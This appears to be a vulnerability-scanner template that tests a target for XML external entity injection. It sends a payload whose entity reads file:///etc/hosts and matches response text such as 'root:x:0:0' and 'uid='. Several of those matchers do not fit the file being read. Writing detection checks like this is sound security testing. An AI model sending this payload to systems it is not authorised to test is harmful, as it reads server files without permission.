id: xxe2-045
name: 'XXE file read in content'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via content'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      content:
        - '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><r>&xxe;</r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'XXE_OK'
          - 'localhost'
          - 'uid='
